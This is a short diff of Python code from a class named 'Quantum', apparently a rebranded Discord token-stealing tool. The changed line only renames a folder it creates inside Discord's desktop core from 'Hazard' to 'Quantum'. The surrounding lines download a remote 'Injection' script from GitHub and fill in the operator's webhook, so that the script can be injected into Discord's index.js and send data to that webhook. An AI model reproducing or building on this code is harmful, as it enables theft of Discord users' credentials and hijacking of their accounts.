@@ -64,7 +64,7 @@ class Quantum:
                 if "discord_desktop_core-" in name:
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
+                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Quantum"))
                     except FileNotFoundError:
                         pass
                     f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
